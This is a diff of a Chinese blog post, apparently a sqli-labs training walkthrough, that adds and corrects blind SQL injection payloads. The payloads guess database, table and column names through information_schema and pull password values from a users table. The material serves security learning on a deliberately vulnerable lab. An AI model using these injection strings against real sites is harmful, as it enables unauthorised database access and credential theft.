@@ -46,9 +46,11 @@
 <meta property="og:image" content="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNDQwMTgyYmJjMmI0ZTZkYi5qcGc">
 <meta property="og:image" content="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNmJmMjQwNjJhZmIxNWVhOS5qcGc">
 <meta property="og:image" content="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMjY0ZWFhMmJmNzUzOTU5NS5qcGc">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191015225656442.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMzQ5MTE2NGNmNjIyMzFmYy5qcGc">
 <meta property="og:image" content="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMzdjNDA2ZTFlMDI5YWNhYy5qcGc">
-<meta property="og:updated_time" content="2019-07-31T16:21:38.015Z">
+<meta property="og:image" content="http://img-blog.csdnimg.cn/20191015225212781.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70">
+<meta property="og:updated_time" content="2019-10-15T14:59:26.986Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs攻关1(错误型注入、双注入)">
 <meta name="twitter:description" content="前言为了更好的学习和练习有关SQL注入的知识,于是我开启了sqli-labs的通关之路。。。。  为了方便学习查看，我在源码中的$sql下一句语句写以下php语句（就是输出拿到数据库查询的完整语句是怎么样的） echo &quot;你的 sql 语句是：&quot;.$sql.&quot;&amp;lt;br&amp;gt;&quot;; 在开始注入之前，我学习了下面这些相关sql注入基础知识。 sql注入基础知识1.判断是否存在sql注入1、get">
@@ -409,8 +411,9 @@
 <p>payload3错误并无回显，表的开头排序第一位后面没有i</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1" and left((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>)&lt;<span class="string">'i'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 <p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMjY0ZWFhMmJmNzUzOTU5NS5qcGc" alt></p>
-<p><code>left((select database()),1)&lt;&#39;s&#39;</code> 中<code>1</code>表示当前有1个字符取开头1个字符来猜测是否存在，这个顺序是前到后，是有顺序的。如果更换为<code>8</code>,那么就表示当前有8个字符取8个字符来猜测是否存在；所以s<code>要改为</code>security`刚好8个字符8个排序，8个字符一起对比是正确还是错误。</p>
-<p>这样，我可以很快得知表名为<code>security</code></p>
+<p><code>left((select database()),1)&lt;&#39;s&#39;</code> 中<code>1</code>表示当前有1个字符取开头1个字符来猜测是否存在，这个顺序是前到后，是有顺序的。如果更换为<code>8</code>,那么就表示当前有8个字符取8个字符来猜测是否存在；所以<code>s</code>要改为<code>security</code>刚好8个字符8个排序，8个字符一起对比是正确还是错误。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1" and left((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">8</span>)=<span class="string">'security'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/20191015225656442.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt><br>这样，我可以得知表名为<code>security</code></p>
 <p><strong>2、爆数据表</strong></p>
 <p>payload1 从limit 的第1个数据第1行数据开始猜解</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1" and left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>)=<span class="string">'u'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
@@ -418,10 +421,12 @@
 <p>payload2 从limit 从第5条数据取第1条数据开始猜解；<code>limit 4,1</code> 表示第5条数据，程序世界的排序01234</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1" and left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">1</span>)=<span class="string">'u'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 <p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMzdjNDA2ZTFlMDI5YWNhYy5qcGc" alt></p>
-<p>修改limit x,1和left中的位数限定数字，爆破到第一张表为referer，终于在第三张表爆破到user表，名为users</p>
+<p>修改limit x,1和left中的位数限定数字，在第三张表爆破到user表，名为users</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1" and left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">5</span>)=<span class="string">'users'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://img-blog.csdnimg.cn/20191015225212781.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt></p>
 <p><strong>3、爆数据列(字段)</strong></p>
 <p>与上面大致是同理的，所以直接上payload</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1" and left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">8</span>)=<span class="string">'password'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1" and left((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>),<span class="number">8</span>)=<span class="string">'password'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 <p><strong>4、爆数据值</strong></p>
 <p>与上面大致是同理的，所以还是直接上payload</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=1" and left((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)=<span class="string">'d'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
@@ -432,7 +437,7 @@
 
             <div class="post-copyright">
     <div class="content">
-        <p>最后更新： 2019年08月01日 00:21</p>
+        <p>最后更新： 2019年10月15日 22:59</p>
         <p>原始链接： <a class="post-url" href="/2019/06/10/sqli-labs攻关1(错误型注入、双注入)/" title="sqli-labs攻关1(错误型注入、双注入)">https://qwzf.github.io/2019/06/10/sqli-labs攻关1(错误型注入、双注入)/</a></p>
         <footer>
             <a href="https://qwzf.github.io">
